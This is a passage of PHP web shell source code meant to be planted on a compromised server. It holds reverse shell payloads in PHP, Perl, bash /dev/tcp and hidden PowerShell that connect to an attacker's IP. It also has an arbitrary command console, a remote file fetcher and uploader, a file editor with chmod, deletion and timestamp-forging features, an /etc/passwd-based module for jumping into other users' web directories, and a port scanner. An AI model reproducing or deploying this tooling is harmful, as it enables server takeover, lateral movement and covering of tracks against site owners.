      $command = "php -r '\$sock=fsockopen(\"$ip\",$port);stream_set_blocking(\$sock, 0);\$cmd=\"/bin/sh -i\";proc_close(proc_open(\$cmd, array(0=>\$sock, 1=>\$sock, 2=>\$sock), \$foo));'";
  }elseif($backdoor == 4){
      $command = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
  }elseif($backdoor == 5){
      $command = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
  }elseif($backdoor == 6){
      $command = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\'$ip\',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()';
  }
  if (function_exists('system')) {
    system($command);
} elseif (function_exists('exec')) {
    exec($command);
} elseif (function_exists('shell_exec')) {
    shell_exec($command);
} elseif (function_exists('passthru')) {
    passthru($command);
} elseif (function_exists('popen')) {
    $handle = popen($command, 'r');
    if ($handle) {
        while (!feof($handle)) {
            echo fgets($handle, 4096);
        }
        pclose($handle);
    }
} else {
    proc_open($command, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes);
}
//tambahan buat backticks
echo `$command`;
}
}
    
    // console
    if ($_1337["id"] == "cmd") {
        s();
        echo '<center class="anu">Command (Use Many Functions!)</center>';
        if (!empty($_POST["cmd"])) {
            $cmd = exe($_POST["cmd"] . " 2>&1");
        }
        echo "
		<div class='mb-3'>
			<form method='POST'>
				<div class='input-group mb-3'>
					<input class='form-control btn-sm text-dark' type='text' name='cmd' value='" .
            htmlspecialchars($_POST["cmd"], ENT_QUOTES, "UTF-8") .
            "' placeholder='whoami' $_r>
					<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-capslock'></i></button>
				</div>
			</form>";
        if ($cmd):
            echo '
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;">$&nbsp;<rd>' .
                htmlspecialchars($_POST["cmd"]) .
                "</rd><br><code>" .
                htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") .
                '</code></pre>
				</div>
			</div>';
        elseif (!$cmd && $_SERVER["REQUEST_METHOD"] == "POST"):
            echo '
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;"><code>No result</code></pre>
				</div>
			</div>
		</div>';
        endif;
    }
    // multiple file upload
    if ($_1337["id"] == "upload") {
        s();
        echo '<center class="anu">Upload File (From URL + Your Computer)</center>';
        $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";
        if ($_SERVER["REQUEST_METHOD"] === "POST") {
			if (isset($_POST["url"]) && isset($_POST["output_filename"]) && isset($_POST["method"])) {
                $url = $_POST["url"];
                $outputFilename = $_POST["output_filename"];
                $method = $_POST["method"];
                $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";
                if ($method == "auto") {
                    // Coba menggunakan cURL
                    $ch = curl_init($url);
                    $options = [
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_FOLLOWLOCATION => true,
                        CURLOPT_SSL_VERIFYPEER => false,
                        CURLOPT_USERAGENT => $userAgent,
                        CURLOPT_REFERER => 'https://www.google.com/'
                    ];
            
                    curl_setopt_array($ch, $options);
                    $fileContent = curl_exec($ch);
                    if ($fileContent !== false && strlen($fileContent) > 0) {
                        file_put_contents($outputFilename, $fileContent);
                        $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($outputFilename);
                        echo "<center><p>Gotcha! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>" . basename($outputFilename) . "</a></center><br>";
                    } else {
                        echo "<script>alert('cURL failed or returned empty content! Trying alternative methods...')</script>";
            
                        // Coba menggunakan file_get_contents
                        $fileContent = @file_get_contents($url);
                        if ($fileContent !== false && strlen($fileContent) > 0) {
                            file_put_contents($outputFilename, $fileContent);
                            $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($outputFilename);
                            echo "<center><p>Gotcha! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>" . basename($outputFilename) . "</a></center><br>";
                        } else {
                            echo "<script>alert('file_get_contents failed or returned empty content! Trying alternative methods...')</script>";
            
                            // Coba menggunakan fopen() dan fread()
                            $file = @fopen($url, "rb");
                            if ($file) {
                                $newFile = fopen($outputFilename, "wb");
                                if ($newFile) {
                                    while (!feof($file)) {
                                        fwrite($newFile, fread($file, 1024 * 8), 1024 * 8);
                                    }
                                    fclose($newFile);
                                }
                                fclose($file);
            
                                // Periksa apakah file terbuat dengan baik
                                if (filesize($outputFilename) > 0) {
                                    $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($outputFilename);
                                    echo "<center><p>Gotcha! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>" . basename($outputFilename) . "</a></center><br>";
                                } else {
                                    echo "<script>alert('fopen() and fread() failed or returned empty content! Trying alternative methods...')</script>";
            
                                    // Coba menggunakan file_put_contents() dengan context
                                    $context = stream_context_create([
                                        "http" => [
                                            "method" => "GET",
                                            "header" => "User-Agent: $userAgent"
                                        ]
                                    ]);
                                    $fileContent = @file_get_contents($url, false, $context);
                                    if ($fileContent !== false && strlen($fileContent) > 0) {
                                        file_put_contents($outputFilename, $fileContent);
                                        $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($outputFilename);
                                        echo "<center><p>Gotcha! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>" . basename($outputFilename) . "</a></center><br>";
                                    } else {
                                        echo "<script>alert('file_put_contents() with context failed or returned empty content! Trying the last alternative method...')</script>";
            
                                        // Coba menggunakan Copy disertai dengan user-agent yang lengkap
                                        $options = [
                                            'http' => [
                                                'user_agent' => $userAgent
                                            ]
                                        ];
                                        $context = stream_context_create($options);
                                        if (@copy($url, $outputFilename, $context)) {
                                            $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($outputFilename);
                                            echo "<center><p>Gotcha! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>" . basename($outputFilename) . "</a></center><br>";
                                        } else {
                                            echo "<script>alert('All methods failed!')</script>";
                                        }
                                    }
                                }
                            } else {
                                echo "<script>alert('fopen() failed!')</script>";
                            }
                        }
                    }
                    curl_close($ch);
            } elseif ($method == "curl") {
					$ch = curl_init($url);
					$options = [
						CURLOPT_RETURNTRANSFER => true,
						CURLOPT_FOLLOWLOCATION => true,
						CURLOPT_SSL_VERIFYPEER => false,
						CURLOPT_USERAGENT => $userAgent,
						CURLOPT_REFERER => 'https://www.google.com/'
					];
		
					curl_setopt_array($ch, $options);
					$fileContent = curl_exec($ch);
					if (curl_errno($ch)) {
						echo "<script>alert('Doesn\'t support cURL, can\'t upload files from URL!')</script>";
					} else {
						file_put_contents($outputFilename, $fileContent);
						$downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($outputFilename);
						echo "<center><p>Gotcha! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>" . basename($outputFilename) . "</a></center><br>";
					}
					curl_close($ch);
				} elseif ($method == "file_get_contents") {
					$opts = [
						'http' => [
							'method' => "GET",
							'header' => "User-Agent: $userAgent\r\n" .
										"Referer: https://www.google.com/\r\n"
						]
					];
					$context = stream_context_create($opts);
					$fileContent = file_get_contents($url, false, $context);
					if ($fileContent !== false) {
						file_put_contents($outputFilename, $fileContent);
						$downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($outputFilename);
						echo "<center><p>Gotcha! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>" . basename($outputFilename) . "</a></center><br>";
					} else {
						echo "<script>alert('Failed to fetch file content using file_get_contents!')</script>";
					}
				} elseif ($method == "fopen") {
					$opts = [
                        'http' => [
                            'method' => "GET",
                            'header' => "User-Agent: $userAgent\r\n" .
                                        "Referer: https://www.google.com/\r\n"
                        ]
                    ];
                    $context = stream_context_create($opts);
                    $fp = fopen($url, 'r', false, $context);
                    if ($fp) {
                        $fileContent = stream_get_contents($fp);
                        fclose($fp);
                        if ($fileContent !== false) {
                            file_put_contents($outputFilename, $fileContent);
                            $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($outputFilename);
                            echo "<center><p>Gotcha! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>" . basename($outputFilename) . "</a></center><br>";
					} else {
						echo "<script>alert('Failed to fetch file content using fopen!')</script>";
					}
				} else {
					echo "<script>alert('Invalid method selection!')</script>";
				}
			}
		}
        
    }
		echo '<div class="card card-body text-dark input-group mb-3">
		<form action="" method="post">
		<div class="form-group d-flex align-items-center">
			<input type="text" class="form-control form-control-sm text-dark flex-grow-1" placeholder="http://piranha.go.id/yourfile.ext" name="url" id="url" required>
			<input type="text" class="form-control form-control-sm text-dark" name="output_filename" placeholder="saved.txt" id="output_filename" required style="width: 300px;">
			<select class="form-control form-control-sm text-dark" name="method" id="method" required style="width: 200px;">
            <option value="auto">All Method (Use this brody!)</option>
			<option value="curl">cURL</option>
			<option value="file_get_contents">file_get_contents</option>
			<option value="fopen">fopen</option>
			</select>
			<button class="btn btn-dark btn-sm" type="submit" name="upl">Save!</button>
		</div>
		</form>		
            <form method="POST" enctype="multipart/form-data">
                <div class="input-group">
                    <input class="form-control form-control-sm text-dark" type="file" name="file[]" multiple="">
                    <div class="input-group-append">
                        <button class="btn btn-dark btn-sm" type="submit" name="upl">Upload!</button>
                    </div>
                </div>
            </form>
        </div>
        </div>
    </div>';
    if(isset($_POST["upl"])) {
    $result = count($_FILES["file"]["name"]);
    for ($contents = 0; $contents < $result; $contents++) {
        $namefile = $_FILES["file"]["name"][$contents];
        if ($_FILES["file"]["size"][$contents] === 0) {
            $up = @copy(
                $_FILES["file"]["tmp_name"][$contents],
                "$path/" . $namefile
            );
            if (!$up) {
                $fileContent = file_get_contents($_FILES["file"]["tmp_name"][$contents]);
                if ($fileContent !== false) {
                    $up = file_put_contents("$path/" . $namefile, $fileContent);
                }
            }
        } else {
            $up = move_uploaded_file(
                $_FILES["file"]["tmp_name"][$contents],
                "$path/" . $namefile
            );
        }
    }
            if ($result < 2) {
                if ($up) {
                    $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($namefile);
                    echo "<br><center><p>G0tchaa! Click the link below to access the uploaded file:</p><a href='$downloadLink' target='_blank' class='btn btn-danger'>".basename($namefile)."</a></center><br>";
                    #echo "<div class='alert alert-success' role='alert'>Upload $namefile OK!</div>";
                } #else {
                    #echo "<div class='alert alert-danger' role='alert'>Upload FAIL!</div>";
                #}
            } else {
                echo "<div class='alert alert-success' role='alert'>Upload $result OK!</div>";
            }
        }
    }
// openfile
if (isset($_1337["opn"])) {
    $file = $_1337["opn"];
}
// view
if ($_1337["action"] == "view") {
    s();
    echo "<div class='btn-group'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>

		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;" .
        basename($file) .
        "
		</br>
		<div class='bg-dark'>
			<div class='container-fluid language-javascript'>
				<textarea rows='10' class='form-control' disabled=''>" .
        htmlspecialchars(file_get_contents($file)) .
        "</textarea>
			</div>
		</div>";
}
// edit
if (isset($_1337["edit_file"])) {
    $updt = fopen("$file", "w");
    $result = fwrite($updt, $_1337["contents"]);
    if ($result) {
        echo "<strong>Edit file</strong> OK! " . ok() . "</div>";
    } else {
        echo "<strong>Edit file</strong> FAIL! " . er() . "</div>";
    }
}
if ($_1337["action"] == "edit") {
    s();
    echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>

		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;" .
        basename($file) .
        "
		</br>
		<form method='POST'>
			<textarea class='form-control btn-sm' rows='10' name='contents' $_r>" .
        htmlspecialchars(file_get_contents($file)) .
        "</textarea>
			<div class='d-grid gap-2'><br>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='edit_file'><i class='bi bi-capslock'></i></button>
			</div>
		</form>";
}
//rename folder
if ($_1337["action"] == "rename_folder") {
    if ($_1337["r_d"]) {
        $r_d = rename(
            $dir,
            "" . dirname($dir) . "/" . htmlspecialchars($_1337["r_d"]) . ""
        );
        if ($r_d) {
            echo "<strong>Rename folder</strong> OK! " .
                ok() .
                '<a class="btn-close" href="?path=' .
                dirname($dir) .
                '"></a></div>';
        } else {
            echo "<strong>Rename folder</strong> FAIL! " .
                er() .
                '<a class="btn-close" href="?path=' .
                dirname($dir) .
                '"></a></div>';
        }
    }
    s();
    echo "
		<div class='btn-group'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified_folder'><i class='bi bi-calendar-date'></i></a>
<!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod'><i class='bi bi-file-earmark-medical'></i></a>-->
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
		</div>
		<br>
			<i class='bi bi-folder-fill'></i>:&nbsp;" .
        basename($dir) .
        "
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' value='" .
        basename($dir) .
        "' name='r_d' $_r>
				<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-capslock'></i></button>
			</div>
		</form>";
}
//rename file
if (isset($_1337["r_f"])) {
    $old = $file;
    $new = $_1337["new_name"];
    rename($new, $old);
    if (file_exists($new)) {
        echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert">
			<strong>Rename file</strong> name already in use! <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
		</div>';
    } else {
        if (rename($old, $new)) {
            echo "<strong>Rename file</strong> OK! " . ok() . "</div>";
        } else {
            echo "<strong>Rename file</strong> FAIL! " . er() . "</div>";
        }
    }
}
if ($_1337["action"] == "rename") {
    s();
    echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>

		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;" .
        basename($file) .
        "
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='new_name' value='" .
        basename($file) .
        "' $_r>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='r_f'><i class='bi bi-capslock'></i></button>
			</div>
		</form>";
}
// chemod
if ($_1337["action"] == "chemod") {
    s();

    function chmodItem($itemPath, $newPermission)
    {
        if (is_file($itemPath)){
            if (chmod($itemPath, octdec($newPermission))) {
                return true;
            } else {
                return false;
            }
        }
        return false;
    }

    function chmodDirectory($dirPath, $newPermission)
    {
        $items = scandir($dirPath);
        foreach ($items as $item) {
            if ($item != "." && $item != "..") {
                $itemPath = $dirPath . "/" . $item;
                if (is_dir($itemPath)) {
                    chmodDirectory($itemPath, $newPermission);
                }
                chmodItem($itemPath, $newPermission);
            }
        }
    }

    $itemToChmod = $_GET["opn"];
    $itemPathToChmod = $path . "/" . $itemToChmod;

    echo "<div class='btn-group'>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
    <a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
    </div>
    <br><i class='bi " . (is_dir($itemPathToChmod) ? "bi-folder" : "bi-file-earmark") . "'></i>:&nbsp;" . basename($itemPathToChmod) . "</br>
    <form method='POST'><div class='input-group'><input class='form-control btn-sm' type='text' name='new_permission' placeholder='0777' $_r>
    <button class='btn btn-outline-light btn-sm' type='submit' name='chemodkan'><i class='bi bi-capslock'></i></button>
    </div>
    </form>";

    // Check if the form is submitted
    if (isset($_POST["chemodkan"])) {
        $newPermission = $_POST["new_permission"];
        if (is_dir($itemPathToChmod)) {
            chmodDirectory($itemPathToChmod, $newPermission);
        } else {
            chmodItem($itemPathToChmod, $newPermission);
        }

        echo "<strong>Change Permission</strong> OK! " . ok() . "</div>";
    }
}


// jumping
if ($_1337["id"] == "jumping") {
    s();
    $i = 0;
    echo "<center class='anu'>Jumping</center>
    <div class='card card-body text-dark input-group mb-3'>";
    echo "<pre>";
    ($etc = fopen("/etc/passwd", "r")) or
        die("<font color=red>Can't read /etc/passwd</font>");
    while ($passwd = fgets($etc)) {
        if ($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all("/(.*?):x:/", $passwd, $jumpss);
            foreach ($jumpss[1] as $uservaljump) {
                $valuserjumpindir = "/home/$uservaljump/public_html";
                if (is_readable($valuserjumpindir)) {
                    $i++;
                    $jrw = "[<i class='bi bi-file-earmark'></i> | R] <a href='?path=$valuserjumpindir'>$valuserjumpindir</a>";
                    if (is_writable($valuserjumpindir)) {
                        $jrw = "[<i class='bi bi-file-earmark-fill'></i> | RW] <a href='?path=$valuserjumpindir'>$valuserjumpindir</a>";
                    }
                    echo $jrw;
                    if (function_exists("posix_getpwuid")) {
                        $domain_jump = file_get_contents("/etc/named.conf");
                        if ($domain_jump == "") {
                            echo " -> [<font color=red>Cannot get domain name</font>]";
                        } else {
                            preg_match_all(
                                "#/var/named/(.*?).db#",
                                $domain_jump,
                                $domjump
                            );
                            foreach ($domjump[1] as $dj) {
                                $valuserjump = posix_getpwuid(
                                    @fileowner("/etc/valiases/$dj")
                                );
                                $valuserjump = $valuserjump["name"];
                                if ($valuserjump == $uservaljump) {
                                    echo " -> [<u>$dj</u>]<br>";
                                    break;
                                }
                            }
                        }
                    } else {
                        echo "<br>";
                    }
                }
            }
        }
    }
    if ($i == 0) {
    } else {
        echo "<br>Total " .$i ." Can jumping on this server " .gethostbyname($_SERVER["HTTP_HOST"]) ."!";}
    echo "</pre>
    </div>";

}
// port scanner
if ($_1337["id"] == "portscan") {
    s();
    echo '<center class="anu">Port Scanner</center>';
    echo "
    <div class='card card-body text-dark input-group mb-3'>
    <form method='post'>
        <div class='form-group'>
            <i class='bi bi-hdd-network'></i> Target IP:
            <input type='text' class='form-control btn-sm text-dark' name='target' placeholder='Enter IP address' required>
        </div>
        <div class='form-group'>
            <i class='bi bi-hdd'></i> Start Port:
            <input type='number' class='form-control btn-sm text-dark' name='startPort' placeholder='Enter start port' required>
        </div>
        <div class='form-group'>
            <i class='bi bi-hdd'></i> End Port:
            <input type='number' class='form-control btn-sm text-dark' name='endPort' placeholder='Enter end port' required>
        </div>
        <div class='d-grid gap-2'>
        <input class='btn btn-dark btn-sm' type='submit' name='scan' value='Submit!'>
        </div>
    </form>
</div>";
if (isset($_POST['scan'])) {
    $target = isset($_POST['target']) ? $_POST['target'] : 'localhost';
    $startPort = $_POST['startPort'];
    $endPort = $_POST['endPort'];

    echo "<div class='card card-body text-dark'><ul>";
for ($port = $startPort; $port <= $endPort; $port++) {
    $connection = @fsockopen($target, $port, $errno, $errstr, 1);

    echo "<li>";
    echo "Port $port: ";
    if ($connection) {
        echo "<gr>Open</gr>";
        fclose($connection);
    } else {
        echo "<rd>Close</rd>";
    }
    echo "</li>";
}
echo "</ul></div>";

}
    
}

// change date modified folder
if ($_1337["action"] == "changemodified_folder") {
    s();
    function changeDate($itemPath, $newDate)
    {
        if (is_file($itemPath) || is_dir($itemPath)) {
            if (touch($itemPath, strtotime($newDate))) {
                return true;
            } else {
                return false;
            }
        }
        return false;
    }
    $currentTime = microtime(true);
    $microseconds = sprintf("%06d", ($currentTime - floor($currentTime)) * 1000000);
    $dateTimeWithMicroseconds = date("Y-m-d H:i:s.", $currentTime) . $microseconds;
    $itemToChangeDate = $_GET["opn"];
    $itemPathToChangeDate = $path . "/" . $itemToChangeDate;
    echo "<div class='btn-group'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified_folder'><i class='bi bi-calendar-date'></i></a>
<!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod'><i class='bi bi-file-earmark-medical'></i></a>-->
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
</div>
<br><i class='bi " . (is_dir($itemPathToChangeDate) ? "bi-folder" : "bi-file-earmark") . "'></i>:&nbsp;" . basename($itemPathToChangeDate) . "</br>
<form method='POST'><div class='input-group'><input class='form-control btn-sm' type='text' name='new_date' value='".$dateTimeWithMicroseconds."' $_r>
<button class='btn btn-outline-light btn-sm' type='sumbit' name='changemodified_folder'><i class='bi bi-capslock'></i></button>
</div>
</form>";

    if (isset($_POST["changemodified_folder"])) {
        $newDate = $_POST["new_date"];
        if (changeDate($itemPathToChangeDate, $newDate)) {
            echo "<strong>Change Date</strong> OK! " . ok() . "</div>";
        } else {
            echo "<strong>Change Date</strong> FAIL! " . er() . "</div>";
        }
    }
}
// change date modified
if ($_1337["action"] == "changemodified") {
    s();
    function changeDate($itemPath, $newDate)
    {
        if (is_file($itemPath) || is_dir($itemPath)) {
            if (touch($itemPath, strtotime($newDate))) {
                return true;
            } else {
                return false;
            }
        }
        return false;
    }
    $currentTime = microtime(true);
    $microseconds = sprintf("%06d", ($currentTime - floor($currentTime)) * 1000000);
    $dateTimeWithMicroseconds = date("Y-m-d H:i:s.", $currentTime) . $microseconds;
    $itemToChangeDate = $_GET["opn"];
    $itemPathToChangeDate = $path . "/" . $itemToChangeDate;
    echo "<div class='btn-group'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
</div>
<br><i class='bi " . (is_dir($itemPathToChangeDate) ? "bi-folder" : "bi-file-earmark") . "'></i>:&nbsp;" . basename($itemPathToChangeDate) . "</br>
<form method='POST'><div class='input-group'><input class='form-control btn-sm' type='text' name='new_date' value='".$dateTimeWithMicroseconds."' $_r>
<button class='btn btn-outline-light btn-sm' type='sumbit' name='changemodified'><i class='bi bi-capslock'></i></button>
</div>
</form>";

    if (isset($_POST["changemodified"])) {
        $newDate = $_POST["new_date"];
        if (changeDate($itemPathToChangeDate, $newDate)) {
            echo "<strong>Change Date</strong> OK! " . ok() . "</div>";
        } else {
            echo "<strong>Change Date</strong> FAIL! " . er() . "</div>";
        }
    }
}
//delete file
if ($_1337["action"] == "delete_file") {
    s();
    if ($_1337["yeahx"]) {
        $delete = unlink($file);
        if ($delete) {
            echo "<strong>Delete file</strong> OK! " . ok() . "</div>";
        } else {
            echo "<strong>Delete file</strong> FAIL! " . er() . "</div>";
        }
    }
    echo "
		<div class='btn-group mb-3'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
		</div>
		<div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : " .
        basename($file) .
        " ?</p>
			<form method='POST'>
				<a class='btn btn-dark btn-block btn-sm' href='?dir=$dir'>No</a>
				<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
}
//delete folder
if ($_1337["action"] == "delete_folder") {
    s();
    if ($_1337["yeah"]) {
    if (is_dir($dir)) {
        if (is_writable($dir)) {
            // Hapus semua file dan subdirektori
            if (deleteDir($dir)) {
                echo "<strong>Delete folder</strong> OK! " . ok() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></div>';
            } else {
                echo "<strong>Delete folder</strong> FAIL! " . er() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></div>';
            }
        } else {
            echo "<strong>Delete folder</strong> FAIL! " . er() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></div>';
        }
    }
}
    echo "<div class='btn-group mb-3'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified_folder'><i class='bi bi-calendar-date'></i></a>
<!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod'><i class='bi bi-file-earmark-medical'></i></a>-->
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
</div><div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : " .
        basename($dir) .
        " ?</p>
			<form method='POST'>
				<a class='btn btn-dark btn-block btn-sm' href='?dir=" .
        dirname($dir) .
        "'>No</a>
				<input type='submit' name='yeah' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
}
if (isset($_1337["filenew"])) {
    s();
